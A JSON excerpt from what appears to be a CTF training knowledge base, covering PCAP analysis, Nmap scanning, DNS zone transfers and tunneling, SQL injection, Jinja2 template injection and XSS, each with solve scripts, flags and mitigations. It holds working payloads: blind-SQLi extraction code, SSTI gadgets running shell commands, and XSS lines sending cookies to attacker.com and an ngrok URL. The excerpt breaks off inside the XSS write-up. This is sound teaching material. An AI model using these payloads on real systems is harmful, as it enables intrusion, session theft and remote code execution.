      "challenge_name": "Wireshark Twoo Twooo (Network PCAP Analysis)",
      "scenario": "Solvers are given a 15MB PCAP file 'dump.pcap'. Network telemetry logs indicate that an adversary exfiltrated data across DNS or HTTP requests.",
      "solve_steps": [
        "1. Inspect HTTP traffic: tshark -r dump.pcap -Y 'http.request' | head -20",
        "2. Notice multiple base64-encoded strings inside HTTP GET parameters: /flag?data=...",
        "3. Extract and concatenate query strings: tshark -r dump.pcap -Y 'http.request.uri contains \"data=\"' -T fields -e http.request.uri",
        "4. Clean string output and decode base64: python3 -c 'import urllib.parse, base64; print(base64.b64decode(...))'",
        "5. Flag recovered: CTF{TCP_STR3AM_R3CONSTRUCTION_SUCCESS}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport subprocess, urllib.parse, base64\n\ndef solve():\n    cmd = \"tshark -r dump.pcap -Y 'http.request.uri contains \"data=\"' -T fields -e http.request.uri\"\n    lines = subprocess.check_output(cmd, shell=True, text=True).splitlines()\n    raw_b64 = \"\".join([l.split(\"data=\")[-1] for l in lines if \"data=\" in l])\n    decoded = base64.b64decode(urllib.parse.unquote(raw_b64)).decode()\n    print(\"[+] Decoded Payload:\", decoded)\n\nif __name__ == '__main__':\n    solve()",
      "flag": "CTF{TCP_STR3AM_R3CONSTRUCTION_SUCCESS}",
      "mitigation": "Enforce TLS 1.3 encryption across all internal and external network channels to prevent plain-text eavesdropping and packet inspection."
    }
  },
  "networking-nmap": {
    "id": "networking-nmap",
    "domain": "networking",
    "category": "Network Reconnaissance",
    "title": "Network Reconnaissance Architecture & Nmap Scanning Internals",
    "subtitle": "Raw Socket BPF Crafting, SYN Stealth State Machines, Timing Templates & NSE Scripting",
    "diagram": "+-----------------------------------------------------------------+\n|                   Nmap Port Scanning State Machine              |\n+-----------------------------------------------------------------+\nAttacker (Raw Socket)                      Target Port\n       |                                       |\n       | ------------ 1. TCP SYN ------------> |\n       |                                       |\n       | <--- 2a. TCP SYN/ACK (PORT OPEN) ---- |\n       | ------------ 3. TCP RST ------------> | (Connection torn down,\n       |                                       |  half-open, no app log!)\n       |                                       |\n       | <--- 2b. TCP RST/ACK (PORT CLOSED) -- |\n       |                                       |\n       | <--- 2c. No Response / ICMP (FILTERED)- [Firewall / Drop]",
    "theory": "Network port scanners identify active network hosts and exposed transport-layer listening ports. The Network Mapper (Nmap) achieves high performance by bypassing high-level operating system socket APIs and constructing raw Ethernet and IP frames directly in user space using `libpcap`.\n\nScanning Techniques & Internal Protocol Signatures:\n1. TCP SYN Stealth Scan (`-sS`, Default Root): Executes a 'half-open' handshake. Sends a raw SYN segment. If the target returns SYN-ACK, Nmap records the port as OPEN and immediately transmits a RST packet to tear down the embryonic connection. Because the full 3-way handshake never completes, application-layer listeners (Apache, Nginx, OpenSSH) rarely log the interaction, reducing detection.\n2. TCP Connect Scan (`-sT`, Non-Root): When raw socket creation privileges (`CAP_NET_RAW`) are unavailable, Nmap falls back to invoking the standard POSIX `connect()` system call. The operating system kernel completes the full 3-way handshake. Slower, and heavily logged by target firewalls.\n3. UDP Scan (`-sU`): UDP is connectionless. When Nmap sends an empty UDP packet to a closed port, the target host generates an ICMP Port Unreachable packet (Type 3, Code 3). If no ICMP response arrives after retransmissions, Nmap marks the port as `open|filtered`.\n4. Service Version Fingerprinting (`-sV`): Nmap establishes a connection and interrogates listening ports using a database of protocol-specific probes (nmap-service-probes) and regular expression response signatures.\n5. Nmap Scripting Engine (NSE, `--script`): Lua-based subsystem executing scripts in parallel against open ports to automate vulnerability validation (vuln), authentication auditing, and service enumeration.",
    "commands": [
      {
        "cmd": "nmap -sC -sV -p- -T4 -oA initial_scan 10.10.10.50",
        "why": "Comprehensive scan: checks all 65,535 ports (-p-), runs default safe NSE scripts (-sC), determines software versions (-sV), with fast timing (-T4), saving results in all formats (-oA).",
        "when": "Standard initial engagement scan on CTF target host.",
        "internals": "Constructs asynchronous raw SYN packets; parses banners on open ports; executes Lua NSE scripts.",
        "pitfalls": "Scanning all ports can take several minutes. Start with top 1000 ports first for fast feedback."
      },
      {
        "cmd": "nmap -p 80,443 --script http-enum,http-vuln* 10.10.10.50",
        "why": "Executes specialized HTTP enumeration scripts to discover hidden directories, admin panels, and known web CVEs.",
        "when": "Target has web servers exposed.",
        "internals": "NSE engine sends HTTP requests and matches HTML signatures.",
        "pitfalls": "Aggressive vulnerability scripts may crash unstable challenge services."
      },
      {
        "cmd": "nmap -sn 192.168.1.0/24",
        "why": "Ping sweep: identifies all live IP addresses on a subnet without scanning ports.",
        "when": "Network discovery in multi-host pivoting or enterprise lab environments.",
        "internals": "Transmits ICMP Echo Requests, TCP SYN to port 443, TCP ACK to port 80, and ICMP Timestamp queries.",
        "pitfalls": "Firewalls blocking ICMP will hide hosts. Add `-Pn` in subsequent scans to force port scanning."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: `nmap -sV -p- -T4 target | tee nmap.txt` -> grep open ports directly.",
      "gui_workflow": "Zenmap: Visual topology map, command builder dropdowns, and color-coded host lists. Useful for large network maps but too slow for timed CTF competitions.",
      "speed_tip": "Run `masscan -p1-65535 10.10.10.50 --rate=1000` to find open ports in 10 seconds, then feed only those open ports into `nmap -sV -sC -p<ports>`."
    },
    "triage_workflow": [
      "1. Host Discovery: Verify host is online (`ping` or `nmap -Pn`).",
      "2. Fast Port Discovery: Scan top 1000 common ports (`nmap -F`).",
      "3. Full Port Sweep: Scan all 65,535 ports in background (`nmap -p-`).",
      "4. Service Version Fingerprint: Run `nmap -sV -sC -p <open_ports>`.",
      "5. Investigate Low-Hanging Fruit: Web (80/443), FTP (21 anonymous), SMB (445), SSH (22).",
      "6. Document & Triage: Log all banners and software version numbers."
    ],
    "writeup": {
      "ctf_event": "HackTheBox / VulnHub",
      "challenge_name": "Port-Knocking (Hidden Services)",
      "scenario": "A target server only shows port 22 (SSH) filtered. A clue mentions 'Listen to the knocks: 7000, 8000, 9000'.",
      "solve_steps": [
        "1. Run standard nmap: all ports appear closed or filtered.",
        "2. Notice port-knocking sequence in clue: 7000, 8000, 9000.",
        "3. Send knock sequence using nmap: `for p in 7000 8000 9000; do nmap -Pn --host-timeout 100ms -p $p 10.10.10.20; done`.",
        "4. Alternatively use knock utility or python raw socket script.",
        "5. Re-scan target: Port 1337 is now OPEN!",
        "6. Connect to port 1337: `nc 10.10.10.20 1337` -> receives flag.",
        "7. Flag: CTF{KN0CK_KN0CK_WH05_TH3R3_F1R3W4LL}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport socket, time\n\nTARGET = \"10.10.10.20\"\nKNOCKS = [7000, 8000, 9000]\n\ndef knock():\n    for port in KNOCKS:\n        try:\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(0.2)\n            s.connect((TARGET, port))\n            s.close()\n        except:\n            pass\n        time.sleep(0.1)\n    print(\"[+] Knock sequence transmitted!\")\n\nif __name__ == '__main__':\n    knock()",
      "flag": "CTF{KN0CK_KN0CK_WH05_TH3R3_F1R3W4LL}",
      "mitigation": "Do not rely on port-knocking as a sole security control (security through obscurity). Deploy authenticated VPNs with mutual TLS."
    }
  },
  "networking-dns": {
    "id": "networking-dns",
    "domain": "networking",
    "category": "Network Architecture & Protocols",
    "title": "Domain Name System (DNS) Architecture, Zone Transfers & Tunneling",
    "subtitle": "Hierarchical Resolution, Resource Records (A, CNAME, TXT), AXFR Replication & Covert C2 Channels",
    "diagram": "+-----------------------------------------------------------------+\n|                  DNS Resolution & Covert Tunneling              |\n+-----------------------------------------------------------------+\nClient Query: 'data.attacker.com'\n  |\n  +-> 1. Recursive Resolver (8.8.8.8)\n        |\n        +-> 2. Root Nameserver (.) -> .com TLD Nameserver\n              |\n              +-> 3. Authoritative Nameserver (attacker.com)\n                    [ Controlled by Adversary! ]\n                    - Inspects subdomain: 'data' = base32(secret)\n                    - Returns TXT record containing C2 command!\n                    - Bypasses corporate firewalls allowing outbound UDP 53!",
    "theory": "The Domain Name System (DNS, RFC 1034 / 1035) provides distributed hierarchical hostname-to-IP address resolution. DNS primarily uses UDP port 53 for standard queries and TCP port 53 for queries exceeding 512 bytes (or EDNS0) and zone replication.\n\nResource Record (RR) Taxonomy:\n- A & AAAA: IPv4 (32-bit) and IPv6 (128-bit) host addresses.\n- CNAME (Canonical Name): Alias pointing to another domain name.\n- MX (Mail Exchange): Routing destinations for SMTP mail.\n- TXT (Text): Arbitrary string data (used for SPF, DKIM, site verification, and CTF flag storage).\n- SOA (Start of Authority): Zone serial numbers, refresh timers, and admin email.\n- NS (Name Server): Authoritative nameservers for a zone.\n\nCritical CTF Attack & Exfiltration Classes:\n1. DNS Zone Transfer (AXFR): Designed for primary and secondary nameservers to synchronize zone records over TCP. If an administrator leaves AXFR queries unauthenticated, any client can run `dig axfr @ns1.target target.com` to dump the entire internal DNS zone map, exposing hidden internal staging subdomains, development servers, and VPN endpoints.\n2. DNS Tunneling & Exfiltration: Because almost all enterprise firewalls permit outbound UDP port 53 queries to resolve external domains, attackers abuse DNS as a covert channel. By encoding exfiltrated data into subdomain labels (`<base64-chunk>.attacker.com`), the queries travel through trusted recursive resolvers to the attacker's authoritative server.\n3. DNS Rebinding: Attacker-controlled DNS server answers initial query with external IP, then immediately switches the A record to `127.0.0.1` with a TTL of 0 seconds. Bypasses browser Same-Origin Policy (SOP) to access internal localhost services.",
    "commands": [
      {
        "cmd": "dig axfr @ns1.target.ctf target.ctf",
        "why": "Attempts a full DNS zone transfer to dump all internal records, subdomains, and IP mappings.",
        "when": "Reconnaissance upon discovering target authoritative nameservers.",
        "internals": "Establishes TCP connection to port 53 and sends an AXFR query (Type 252).",
        "pitfalls": "Secure servers return `Transfer failed` or `REFUSED`."
      },
      {
        "cmd": "dig +short TXT flag.target.ctf",
        "why": "Retrieves TXT resource records which often contain hidden strings or verification tokens.",
        "when": "Investigating specific challenge subdomains.",
        "internals": "Sends standard UDP query with RR Type 16.",
        "pitfalls": "Long TXT records may be split into multiple quoted character-strings."
      },
      {
        "cmd": "dnsenum --enum target.ctf -f /usr/share/wordlists/subdomains.txt",
        "why": "Automates subdomain discovery via brute-force dictionary querying.",
        "when": "When zone transfers are blocked and target infrastructure is large.",
        "internals": "Multithreaded resolver sending parallel A-record lookups.",
        "pitfalls": "Wildcard DNS records (`*.target.ctf`) will produce false positives for every queried name."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: `dig any target.ctf @8.8.8.8` gives exact DNS responses with headers and flags.",
      "gui_workflow": "Web tools (MXToolbox / DNSDumpster): Visual graphs of domain relationships and mail server maps.",
      "speed_tip": "Use `massdns -r resolvers.txt -t A subdomains.txt` to resolve 100,000 subdomains in under 10 seconds."
    },
    "triage_workflow": [
      "1. Discover Nameservers: `dig NS target.ctf`.",
      "2. Test Zone Transfer: `dig axfr @nameserver target.ctf`.",
      "3. Check Standard Records: Query A, AAAA, MX, and TXT records.",
      "4. Subdomain Enumeration: Run wordlist brute-force if AXFR fails.",
      "5. Reverse DNS Lookups: Scan IP ranges with `dig -x <IP>`.",
      "6. Inspect Certificate Transparency: Check crt.sh for historical subdomains."
    ],
    "writeup": {
      "ctf_event": "Google CTF / DEF CON Qualifier",
      "challenge_name": "Zone-Out (DNS AXFR Leak)",
      "scenario": "A target organization operates an internal DNS server at 10.10.10.53. Solvers must locate the hidden development server holding the flag.",
      "solve_steps": [
        "1. Enumerate nameservers: `dig @10.10.10.53 ns company.lab` -> returns `ns1.company.lab`.",
        "2. Attempt zone transfer: `dig axfr @10.10.10.53 company.lab`.",
        "3. Zone transfer succeeds! Dumps 45 records.",
        "4. Notice TXT record under `staging-secret-vault.company.lab`: `TXT \"CTF{DNS_AXFR_Z0N3_TR4NSF3R_DUMP}\"`.",
        "5. Flag recovered: CTF{DNS_AXFR_Z0N3_TR4NSF3R_DUMP}."
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport dns.zone, dns.query\n\ndef solve_axfr():\n    z = dns.zone.from_xfr(dns.query.xfr('10.10.10.53', 'company.lab'))\n    for name, node in z.nodes.items():\n        for rdataset in node.rdatasets:\n            print(f\"{name} -> {rdataset}\")\n\nif __name__ == '__main__':\n    solve_axfr()",
      "flag": "CTF{DNS_AXFR_Z0N3_TR4NSF3R_DUMP}",
      "mitigation": "Restrict AXFR zone transfers to authorized secondary nameserver IP addresses only (e.g. `allow-transfer { 192.168.1.2; };` in BIND)."
    }
  },
  "web-sqli-ast": {
    "id": "web-sqli-ast",
    "domain": "web",
    "category": "Web Security & Injection",
    "title": "SQL Injection AST Manipulation, Blind Inference & WAF Evasion",
    "subtitle": "Abstract Syntax Tree Tampering, Boolean/Time Timing Oracles, Information Schema & Shell Injection",
    "diagram": "Intended Query: SELECT * FROM users WHERE user = 'USER_INPUT' AND pass = 'PASS_INPUT';\nAST with clean input:\n           AND\n          /   \\\n      user='bob' pass='secret'\n\nMalicious Input: admin' --\nAST Subverted:\n         SELECT\n        /      \\\n     FROM      WHERE\n     users       |\n             user = 'admin' (Trailing pass query parsed as comment, pruned from AST!)\n\nIn-Band UNION Extraction:\n' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--",
    "theory": "SQL Injection (CWE-89) occurs when untrusted user input is directly concatenated or interpolated into an SQL query string rather than passed as strongly-typed parameters via prepared statements. The database SQL lexical analyzer and parser interpret the attacker's metacharacters (quotes, comments, semicolons) as syntactic tokens, fundamentally restructuring the Abstract Syntax Tree (AST) of the query.\n\nMajor SQL Injection Vulnerability Classes:\n1. In-Band UNION-Based SQLi: The most direct exploitation vector. The attacker appends a `UNION SELECT` statement to combine the results of the original application query with rows extracted from database metadata tables (`information_schema.tables`, `sqlite_master`). Two strict mathematical invariants must be satisfied: (a) the injected query must select the exact same number of columns as the original query (discovered via `ORDER BY 1, 2, ... N`), and (b) data types across corresponding columns must be compatible.\n2. Error-Based SQLi: When database query results are not directly rendered in the HTML response, but verbose SQL error messages are returned. Solvers use functions like MySQL's `extractvalue(1, concat(0x7e, (SELECT version())))` or PostgreSQL's `CAST((SELECT password FROM users) AS INT)` to force the database engine to include extracted data directly inside runtime error strings.\n3. Boolean-Based Blind SQLi: Used when no query output and no errors are displayed. The attacker crafts boolean conditions that alter the HTTP response state (e.g. HTTP 200 vs HTTP 404, or the presence of a 'Welcome' string). Plaintext data is recovered character-by-character using binary search over ASCII character values.\n4. Time-Based Blind SQLi: When the HTTP response is completely invariant regardless of boolean outcome. The attacker injects sleep primitives (e.g. `SLEEP(5)` in MySQL, `pg_sleep(5)` in PostgreSQL, `WAITFOR DELAY '0:0:5'` in MSSQL). If the tested predicate is true, the response is delayed by 5 seconds, creating a clean timing side channel.",
    "commands": [
      {
        "cmd": "' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema=database()-- -",
        "why": "Extracts table names from current database in in-band UNION injections.",
        "when": "After determining column count and identifying a reflected text column.",
        "internals": "information_schema is the ANSI-standard metadata catalogue implemented by MySQL, PostgreSQL, and MSSQL.",
        "pitfalls": "SQLite does not have information_schema. Use `SELECT tbl_name FROM sqlite_master WHERE type='table'` for SQLite."
      },
      {
        "cmd": "sqlmap -u 'http://target/item?id=1' --batch --dbs --tamper=space2comment,between",
        "why": "Automates SQLi detection, database enumeration, and bypasses signature-based WAFs.",
        "when": "Authorized assessments and CTF challenges where manual payload crafting is tedious.",
        "internals": "Iterates through heuristic injection polyglots and tests blind timing thresholds.",
        "pitfalls": "Can be noisy and may exhaust database connection pools on fragile target services."
      },
      {
        "cmd": "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) > 80-- -",
        "why": "Executes binary search across character byte values in blind boolean exploitation.",
        "when": "When target page returns subtle visual differences (e.g. User Found vs User Not Found).",
        "internals": "SUBSTRING isolates 1 character; ASCII converts to integer; comparison creates boolean condition.",
        "pitfalls": "Ensure limit and offset are specified if subquery returns multiple rows, otherwise subquery returns error."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: Python `requests` script with binary search recovers a 32-character flag in ~200 HTTP requests in 5 seconds.",
      "gui_workflow": "Burp Suite Intruder / Repeater: Send request to Repeater -> test quote -> observe response length -> craft payload manually.",
      "speed_tip": "In CTF competitions, write a quick Python binary search script instead of linear scanning. A 32-character flag takes only 32 * 7 = 224 HTTP requests with binary search, versus 32 * 64 = 2048 requests with linear search."
    },
    "triage_workflow": [
      "1. Identify Injection Point: Inject `'`, `\"`, `\\`, and check for syntax errors or anomalous responses.",
      "2. Determine Database Engine: Inject comment sequences (`-- -` for MySQL/Postgres, `#` for MySQL, `/*` for general).",
      "3. Determine Column Count: Test `' ORDER BY 1-- -`, `' ORDER BY 5-- -`, `' ORDER BY 10-- -`.",
      "4. Determine Reflected Column Types: Inject `' UNION SELECT 1, 'test', 3-- -`.",
      "5. Enumerate Schema: Extract tables and column names from information_schema / sqlite_master.",
      "6. Dump Credentials / Flag: `SELECT group_concat(flag) FROM secret_flags`."
    ],
    "writeup": {
      "ctf_event": "PortSwigger Web Security / HackTheBox",
      "challenge_name": "Blind SQLi with Time Delays (Binary Search)",
      "scenario": "A tracking cookie 'TrackingId' is vulnerable to time-based blind SQL injection in a PostgreSQL backend.",
      "solve_steps": [
        "1. Test timing probe: `Cookie: TrackingId=x' || (SELECT pg_sleep(5))--`.",
        "2. Server pauses for 5 seconds: Time-based SQLi confirmed.",
        "3. Formulate binary search condition: `TrackingId=x' || (SELECT CASE WHEN (ascii(substr(password, {pos}, 1)) > {mid}) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--`.",
        "4. Multi-thread solver across character positions 1..32.",
        "5. Reconstruct password: `s3cr3t_p4ssw0rd_2026`.",
        "6. Log in as administrator and retrieve flag from /admin/panel."
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport requests, time\n\nTARGET = \"http://target.ctf/filter\"\n\ndef check(pos, mid):\n    payload = f\"x' || (SELECT CASE WHEN (ascii(substr(password, {pos}, 1)) > {mid}) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--\"\n    t0 = time.time()\n    requests.get(TARGET, cookies={\"TrackingId\": payload}, timeout=10)\n    return (time.time() - t0) >= 1.8\n\ndef solve():\n    recovered = \"\"\n    for pos in range(1, 25):\n        low, high = 32, 126\n        while low <= high:\n            mid = (low + high) // 2\n            if check(pos, mid):\n                low = mid + 1\n            else:\n                high = mid - 1\n        recovered += chr(low)\n        print(f\"[+] Character {pos}: {chr(low)} -> {recovered}\")\n\nif __name__ == '__main__':\n    solve()",
      "flag": "CTF{B1N4RY_S34RCH_BL1ND_SQL1_W1N}",
      "mitigation": "Utilize parameterized queries / prepared statements exclusively (e.g. PreparedStatement in Java, PDO in PHP, parameterized SQL in Python). Never concatenate user strings into queries."
    }
  },
  "web-ssti": {
    "id": "web-ssti",
    "domain": "web",
    "category": "Web Security & RCE",
    "title": "Server-Side Template Injection (SSTI) & Sandbox Escapes",
    "subtitle": "Template Engine AST Lifecycles, Jinja2/Twig Reflection, Python MRO Traversal & Arbitrary Execution",
    "diagram": "+-------------------------------------------------------------+\n|                     User HTTP Request                       |\n|  GET /hello?name={{7*7}}                                    |\n+------------------------------+------------------------------+\n                               |\n+------------------------------v------------------------------+\n|            Web Application Server (Flask / Python)          |\n|  Vulnerable: render_template_string(\"Hello \" + name)        |\n+------------------------------+------------------------------+\n                               |\n+------------------------------v------------------------------+\n|              Jinja2 Template Engine Evaluation              |\n|  1. Parser identifies `{{ ... }}` interpolation delimiters  |\n|  2. Evaluates expression in Python AST environment          |\n|  3. Resolves {{7*7}} -> 49                                  |\n|  4. Attacker leverages Python MRO (Method Resolution Order)  |\n|     ''.__class__.__mro__[1].__subclasses__()                |\n|     -> Traverses down to `subprocess.Popen`                 |\n|     -> Spawns `/bin/sh` or executes shellcode               |\n+-------------------------------------------------------------+",
    "theory": "Server-Side Template Injection (SSTI) emerges when user-controlled input is embedded directly into a template file or template string before parsing, rather than passed as dynamic data parameters to an already compiled template. Template engines (Jinja2 for Python, Twig for PHP, Freemarker/Velocity for Java, Pebble for Kotlin) compile template syntax into executable host-language code or bytecode.\n\nWhen a template engine receives unescaped syntax markers (such as `{{ ... }}` in Jinja2/Twig, or `${...}` in Freemarker/JSP), it transitions out of static text emission mode and directly evaluates expressions in its runtime context. In Python/Flask applications utilizing Jinja2, the execution environment retains access to Python object introspection.\n\nPython MRO (Method Resolution Order) Traversal:\nPython's object inheritance allows any instance to traverse upward to the base `object` class via `__class__.__mro__` or `__class__.__bases__`. From `object`, the `__subclasses__()` method returns an array of every class loaded into memory by the Python interpreter process. Solvers iterate through this subclass array to locate classes with operating system execution capabilities, such as `subprocess.Popen`, `os._wrap_close`, or `warnings.catch_warnings` (which imports `builtins.eval`). Once reached, the attacker executes arbitrary shell commands on the underlying web host.",
    "commands": [
      {
        "cmd": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "why": "Dumps all loaded Python classes into the HTTP response to discover available RCE gadgets.",
        "when": "Confirming Jinja2 template engine execution following successful `{{7*7}}` math verification.",
        "internals": "Traverses string class inheritance to object, invoking object.__subclasses__() list reflection.",
        "pitfalls": "Array index numbers vary across Python minor versions. Always search dynamically for 'Popen'."
      },
      {
        "cmd": "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}",
        "why": "Direct short RCE gadget in modern Jinja2 bypassing long MRO array indexing.",
        "when": "When global builtins are not strictly filtered.",
        "internals": "Accesses the `cycler` helper class's global module dictionary containing the imported `os` module.",
        "pitfalls": "Blocked if the template environment overrides globals with a restricted sandbox."
      },
      {
        "cmd": "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        "why": "Traverses the Flask request object globals to reach Python's __import__ primitive.",
        "when": "Testing Flask/Werkzeug web endpoints where the `request` variable is exposed to templates.",
        "internals": "Navigates WSGI application reference table into CPython builtins dictionary.",
        "pitfalls": "Fails on pure Jinja2 standalone scripts that do not pass Flask context objects."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: `curl -G 'http://target/profile' --data-urlencode 'name={{cycler.__init__.__globals__.os.popen(\"cat flag*\").read()}}'` -> instant terminal execution.",
      "gui_workflow": "Burp Suite: Intercept request -> Send to Repeater -> Inject payload in parameter -> Inspect response tab for command output.",
      "speed_tip": "Use tplmap (`python2 tplmap.py -u 'http://target/page?name=*' --os-shell`) to automatically detect template engine flavor (Jinja, Mako, Twig, Velocity) and spawn an interactive shell."
    },
    "triage_workflow": [
      "1. Polyglot Syntax Probe: Inject `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}` to identify template engine syntax.",
      "2. Engine Fingerprinting: Differentiate Jinja2 from Twig using `{{7*'7'}}` (Jinja2 returns '7777777', Twig returns '49').",
      "3. Introspection Exploration: Test access to `__class__` or `self`.",
      "4. Subclass Search: Locate `subprocess.Popen` index in `object.__subclasses__()`.",
      "5. Payload Formulation: Execute `Popen(['cat', '/flag.txt'], stdout=-1).communicate()`.",
      "6. Filter Evasion (if needed): If dots or quotes are filtered, use `request.args` reflection or `dict(b=1)`."
    ],
    "writeup": {
      "ctf_event": "HackTheBox / PicoCTF",
      "challenge_name": "Templated (Jinja2 SSTI to Shell)",
      "scenario": "A Flask web service presents an 'Under Construction' notice displaying the requested path: 'Error 404: /<path> not found'.",
      "solve_steps": [
        "1. Test math expression in URL: curl http://target.ctf/{{7*7}} -> 'Error 404: 49 not found'. SSTI confirmed.",
        "2. Distinguish engine: {{7*'7'}} -> '7777777'. Python Jinja2 engine confirmed.",
        "3. Search for Popen class in subclasses list using short script.",
        "4. Subclass index 414 is `subprocess.Popen`.",
        "5. Execute command: curl 'http://target.ctf/{{''.__class__.__mro__[1].__subclasses__()[414]('cat%20flag.txt',shell=True,stdout=-1).communicate()[0].decode()}}'",
        "6. Read flag from response: CTF{J1NJ42_SST1_PYTH0N_MRO_PWN3D}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport requests, urllib.parse\n\nTARGET = \"http://target.ctf/\"\npayload = \"{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()[0].decode() }}\"\nurl = TARGET + urllib.parse.quote(payload)\n\nr = requests.get(url)\nprint(\"[+] Response:\", r.text.strip())",
      "flag": "CTF{J1NJ42_SST1_PYTH0N_MRO_PWN3D}",
      "mitigation": "Always pass dynamic data as keyword arguments to `render_template('index.html', name=user_input)` rather than using `render_template_string()` with concatenated strings."
    }
  },
  "web-xss-csp": {
    "id": "web-xss-csp",
    "domain": "web",
    "category": "Web Security & Client-Side",
    "title": "Cross-Site Scripting (XSS), Context Escaping & CSP Bypass Mechanics",
    "subtitle": "DOM, Reflected & Stored Execution Lifecycles, Browser Isolation Boundaries & Cookie Exfiltration",
    "diagram": "+-----------------------------------------------------------------+\n|                    Cross-Site Scripting Lifecycle               |\n+-----------------------------------------------------------------+\nAttacker                 Vulnerable Web App            Victim Browser (Admin Bot)\n   |                             |                                  |\n   | --- 1. Injected Payload --->|                                  |\n   |     <script>fetch(...)      |                                  |\n   |                             |                                  |\n   |                             | --- 2. Render Unescaped HTML --->|\n   |                             |                                  |\n   |                             |        [ JavaScript Executed! ] -+\n   |                             |        - Reads document.cookie   |\n   |                             |        - Submits background form |\n   | <--- 3. Exfiltrated Token -------------------------------------+",
    "theory": "Cross-Site Scripting (XSS, CWE-79) occurs when an application includes untrusted data in an HTTP response without adequate validation or context-sensitive encoding, enabling the client browser to interpret user data as executable JavaScript.\n\nThe Three Classic XSS Paradigms:\n1. Reflected XSS: Non-persistent. The malicious payload is reflected immediately off the web server in the current HTTP response (common in search bars, error messages, and URL parameters). The victim must be induced to click a crafted link.\n2. Stored XSS: Persistent. The payload is permanently stored in the application's backend database (comments, user profiles, chat messages). Any user who views the stored content executes the payload automatically. In CTF competitions, challenges frequently provide an 'Admin Bot' (headless Chromium or Puppeteer) that regularly visits solver-submitted URLs.\n3. DOM-Based XSS: Purely client-side. The vulnerability lives entirely in front-end JavaScript: an untrusted 'source' (e.g. `location.search`, `location.hash`, `document.referrer`) flows into an unsafe execution 'sink' (e.g. `element.innerHTML`, `document.write()`, `eval()`). Server-side web filters never see DOM XSS payloads because URL fragments (`#...`) are not transmitted in HTTP requests.\n\nContent Security Policy (CSP) & Bypasses:\nCSP (RFC 7762) is a browser defense-in-depth header (`Content-Security-Policy: script-src 'self' ...`) restricting origins from which scripts can load or execute. Common CTF bypasses include:\n- `unsafe-inline`: Permits inline `<script>` tags, defeating script-src.\n- CDN Endpoints: If `script-src` whitelists `cdnjs.cloudflare.com` or `ajax.googleapis.com`, attackers load older AngularJS or Vue libraries containing known client-side template injection gadgets to achieve code execution.\n- Base-URI Injection: If `base-uri` is missing, injecting `<base href=\"//attacker.com/\">` redirects relative `<script src=\"app.js\">` requests to the attacker's server.",
    "commands": [
      {
        "cmd": "<script>fetch('http://attacker.com/leak?c='+encodeURIComponent(document.cookie))<\\/script>",
        "why": "Standard non-destructive cookie exfiltration payload.",
        "when": "When HTTP response context permits unescaped HTML tags.",
        "internals": "Invokes asynchronous Fetch API to transmit session cookies to external listener.",
        "pitfalls": "Blocked if session cookies have the `HttpOnly` flag set."
      },
      {
        "cmd": "<img src=x onerror=\"fetch('http://attacker.com/?flag='+document.body.innerText)\">",
        "why": "Bypasses filters that specifically strip `<script>` tags by utilizing the `onerror` attribute.",
        "when": "Testing input sanitizers with naive script regexes.",
        "internals": "Browser parses image tag, fails to resolve source 'x', and triggers JavaScript event handler.",
        "pitfalls": "Blocked if quote characters (`\"` or `'`) are filtered; bypass via `String.fromCharCode()`."
      },
      {
        "cmd": "curl -sI https://target.ctf | grep -i content-security-policy",
        "why": "Inspects active Content Security Policy directives to plan bypass strategy.",
        "when": "Before formulating XSS payloads on hardened web applications.",
        "internals": "Parses HTTP response header tokens.",
        "pitfalls": "CSP can also be declared inside `<meta http-equiv='Content-Security-Policy'>` tags in HTML body."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: Start local listener: `python3 -m http.server 8000` or `nc -lvnp 8000` -> Submit URL to target CTF admin bot -> Watch cookie hit.",
      "gui_workflow": "Browser DevTools: Open Console tab -> test `document.cookie` -> Inspect DOM Tree to view exact payload placement and encoding context.",
      "speed_tip": "If external egress is blocked, exfiltrate data via Webhook.site or ngrok URL provided in the prompt."
    },
    "triage_workflow": [
      "1. Identify Reflection Context: Is input inside HTML body, inside an attribute `value=\"...\"`, inside a `<script>` block, or in the DOM?",
      "2. Test Metacharacters: Inject `< > \" ' ` / = ( )` and observe which are sanitized or escaped.",
      "3. Context Escaping: If inside an attribute: `\" autofocus onfocus=\"alert(1)`. If inside script: `';alert(1)//`.",
      "4. Audit CSP Directives: Inspect `script-src`, `connect-src`, and `default-src`.",
      "5. Formulate Exfiltration: Send flag or cookie to attacker endpoint via `fetch()`, `navigator.sendBeacon()`, or `new Image().src`."
    ],
    "writeup": {
      "ctf_event": "Google CTF / PicoCTF",
      "challenge_name": "Note-Sharer (Stored XSS to Admin Cookie)",
      "scenario": "A note-sharing application allows users to submit markdown notes. An 'Report Note to Admin' button triggers an automated headless Chrome bot that opens the note.",
      "solve_steps": [
        "1. Inspect markdown rendering: The application converts markdown using a vulnerable library that passes raw HTML tags.",
        "2. Verify XSS execution locally: `<img src=x onerror=console.log(1)>` executes.",
        "3. Audit cookie security: Target cookie has no `HttpOnly` flag.",
        "4. Start external listener: `ngrok http 8080`.",
        "5. Submit note payload: `<script>fetch('https://ngrok.io/log?c=' + document.cookie)<\\/script>`.",
        "6. Report note URL to admin bot.",
        "7. Listener receives GET request with cookie: `admin_session=CTF{XSS_D0M_C00K1E_TH1EF_2026}`."
      ],
